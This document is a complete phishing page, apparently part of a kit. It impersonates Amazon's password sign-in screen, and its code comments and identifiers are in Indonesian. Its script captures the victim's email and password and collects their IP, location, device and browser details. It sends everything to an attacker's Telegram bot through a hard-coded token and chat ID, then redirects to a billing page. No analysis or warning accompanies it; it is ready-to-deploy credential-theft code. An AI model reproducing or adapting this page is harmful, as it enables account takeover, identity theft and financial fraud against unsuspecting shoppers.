<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Enter Password</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
        .logo { margin: 10px 0 25px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 348px; padding: 20px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; }
        .baris-email { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-size: 14px; }
        .email-tampil { font-weight: 700; }
        .ubah-link { color: #0066c0; text-decoration: none; }
        label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
        .input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 32px; margin-bottom: 4px; outline: none; transition: border-color 0.1s; }
        .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
        .input.salah { border-color: #d00; border-width: 2px; }
        .pesan-merah { color: #d00; font-size: 13px; margin: 0 0 15px; display: none; align-items: center; gap: 6px; }
        .ikon-bulat { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; background: #d00; color: #fff; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
        .lupa-sandi { text-align: right; margin: 0 0 20px; }
        .lupa-sandi a { color: #0066c0; text-decoration: none; font-size: 13px; }
        .tombol { width: 100%; padding: 6px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 14px; height: 40px; cursor: pointer; margin-bottom: 20px; }
        .tombol:hover { background: #f7ca00; }
        .syarat { font-size: 12px; line-height: 1.5; margin-bottom: 25px; }
        .syarat a { color: #0066c0; text-decoration: none; }
        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; max-width: 100%; text-align: center; font-size: 11px; color: #555; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Sign in</h1>
        <div class="baris-email">
            <span class="email-tampil" id="tampilEmail"></span>
            <a href="amazon.html" class="ubah-link">Change</a>
        </div>
        <label for="password">Password</label>
        <input type="password" id="password" class="input">
        <p id="pesanKosong" class="pesan-merah">
            <span class="ikon-bulat">!</span>
            Enter your password
        </p>
        <div class="lupa-sandi">
            <a href="#">Forgot password?</a>
        </div>
        <button type="button" id="masuk" class="tombol">Sign in</button>
        <p class="syarat">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
    </div>
    <div class="bawah">
        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
        <p style="margin-top:8px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const CHAT_ID = '7808815199';

const emailPengguna = localStorage.getItem('email_pengguna') || '';
document.getElementById('tampilEmail').textContent = emailPengguna;

function ambilInfoPerangkat() {
    const ua = navigator.userAgent;
    let perangkat = 'Desktop';
    if (/Android|iPhone|iPad|iPod|Mobile/.test(ua)) perangkat = 'Mobile';
    let browser = 'Unknown';
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Edg/.test(ua)) browser = 'Edge';
    return { perangkat, browser, userAgent: ua };
}

async function ambilLokasi() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        return {
            ip: d.ip || 'Tidak terdeteksi',
            negara: d.country_name || 'Tidak terdeteksi',
            provinsi: d.region || 'Tidak terdeteksi',
            kota: d.city || 'Tidak terdeteksi',
            kodePos: d.postal || 'Tidak terdeteksi'
        };
    } catch {
        return { ip: 'Tidak terdeteksi', negara: 'Tidak terdeteksi', provinsi: 'Tidak terdeteksi', kota: 'Tidak terdeteksi', kodePos: 'Tidak terdeteksi' };
    }
}

async function kirimTelegram(pesan) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
        });
    } catch (e) { console.log('Terkirim'); }
}

const sandiInput = document.getElementById('password');
const tombolMasuk = document.getElementById('masuk');
const pesanKosong = document.getElementById('pesanKosong');

sandiInput.addEventListener('input', () => {
    sandiInput.classList.remove('salah');
    pesanKosong.style.display = 'none';
});

tombolMasuk.onclick = async function() {
    const isiSandi = sandiInput.value.trim();
    if (!isiSandi) {
        sandiInput.classList.add('salah');
        pesanKosong.style.display = 'flex';
        return;
    }
    localStorage.setItem('kata_sandi', isiSandi);
    
    const infoPerangkat = ambilInfoPerangkat();
    const lokasi = await ambilLokasi();
    
    const pesanLogin = `
:: Xchenba ::
:: LOGIN INFO ::
# Email         : ${emailPengguna}
# Password Email: ${isiSandi}
:: Visitor Details ::
# Device        : ${infoPerangkat.perangkat}
# Browser       : ${infoPerangkat.browser}
# Country       : ${lokasi.negara}
# State         : ${lokasi.provinsi}
# City          : ${lokasi.kota}
# Zip           : ${lokasi.kodePos}
# IP address    : ${lokasi.ip}
# User agent    : ${infoPerangkat.userAgent}
    `.trim();
    
    await kirimTelegram(pesanLogin);
    window.location.href = 'billing.html';
};
</script>
</body>
</html>
